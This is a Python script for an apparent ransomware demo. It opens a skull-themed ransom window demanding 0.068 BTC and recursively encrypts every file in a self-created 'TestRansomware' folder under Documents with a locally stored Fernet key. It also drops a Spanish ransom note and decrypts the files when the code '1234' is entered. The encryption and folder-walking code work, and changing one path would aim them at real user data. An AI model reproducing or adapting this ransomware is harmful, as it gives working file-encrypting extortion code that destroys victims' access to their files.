from tkinter import *
from tkinter import messagebox
import tkinter as tk
from PIL import ImageTk, Image
from cryptography.fernet import Fernet
import os

root = Tk()

root.title("YOUT GO PWNED")
root.iconbitmap("C:\\Users\\PIPEX\\Downloads\\skull-icon.ico")
root.resizable(0,0)
root.configure(background='black')

font = ("Arial", 20, "bold")
label1 = Label(root, text="ALL OF YOUR DATA HAS BEEN ENCRYPTED",background="black",font=font,foreground="Red")
label1.pack()

font = ("Arial", 10, "bold")
label2 = Label(root, text="TO DENCRYPT YOUR DATA YOU MUST PAY 0.068BTC",background="black",font=font,foreground="Red")
label2.pack()

gifPath = "C:\\Users\\PIPEX\\Downloads\\skullRoja.gif"
info = Image.open(gifPath)
frames = info.n_frames
im = [tk.PhotoImage(file=gifPath,format=f"gif -index {i}") for i in range(frames)]
gifLabel = tk.Label(image="")
gifLabel.pack()
count = 0
anim = None

def animation(count):
    im2 = im[count]
    gifLabel.config(image=im2)

    count+=1
    if count == frames:
        count = 0
    anim = root.after(50,lambda :animation(count))
animation(count)

frame = tk.Frame(root)
frame.configure(background='black')
frame.pack(expand=True, fill=BOTH)

T = Text(frame, height = 5, width = 52)
T.insert(tk.END,"ENTER CODE HERE TO DECRYPT DATA")
T.configure(background='GRAY4',foreground="GREEN2",font=font)
T.pack(side=LEFT)

def generateKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def returnKey():
    return open("key.key", "rb").read()

def encryp(item,key):
    key = Fernet(key)
    with open(item, "rb") as file:
        file_data = file.read()
    data = key.encrypt(file_data)
    with open(item, "wb") as file:
        file.write(data)

def getPath():
    path = os.path.join(os.environ['USERPROFILE'],"Documents")
    if not os.path.exists(path):
        path = os.path.join(os.environ['USERPROFILE'],"Documentos")
    path = os.path.join(path,"TestRansomware")
    return path

def inspectFolders(path):
    documentos = os.listdir(path)
    for documento in documentos:
        documento = os.path.join(path, documento)
        if(os.path.isdir(documento)):
            inspectFolders(documento)
        else:
            encryp(documento, returnKey())

def rescueText():
    path = getPath()+"\\rescate.txt"
    if not os.path.exists(path):
        with open(path, "w") as file:
            file.write("Archivos encriptados")
            file.close()

def inspectFoldersDecrypt(path):
    documentos = os.listdir(path)
    for documento in documentos:
        documento = os.path.join(path, documento)
        if(os.path.isdir(documento)):
            inspectFoldersDecrypt(documento)
        else:
            decryp(documento, returnKey())

def decryp(item,key):
    key = Fernet(key)
    with open(item, "rb") as file:
        file_data = file.read()
    data = key.decrypt(file_data)
    with open(item, "wb") as file:
        file.write(data)

def removeRescueText():
    path = getPath()+"\\rescate.txt"
    if  os.path.exists(path):
        os.remove(path)

def checkCode():
    if(T.get("1.0","end-1c") == "1234"):
        decryptAll()
        messagebox.showinfo(title="SUCCESS", message="SUCCESS")
        root.quit()
    else:
        messagebox.showerror(title="INVALID CODE", message="INVALID CODE")

def decryptAll():
    removeRescueText()
    inspectFoldersDecrypt(getPath())
    os.remove("key.key")

button = tk.Button(frame, text="SEND", command=checkCode)
button.configure(background='black',foreground="GREEN2",font=font)
button.pack(side=RIGHT,expand=True, fill=BOTH)

if not(os.path.exists(getPath())):
    os.mkdir(getPath())
    with open(os.path.join(getPath(),"testeo.txt"),"w") as f:
        f.write("Archivos encriptados")
        f.close()

if not(os.path.exists("key.key")):
    generateKey()
    inspectFolders(getPath())
    rescueText()
else:
    decryptAll()
    generateKey()
    inspectFolders(getPath())
    rescueText()

root.mainloop()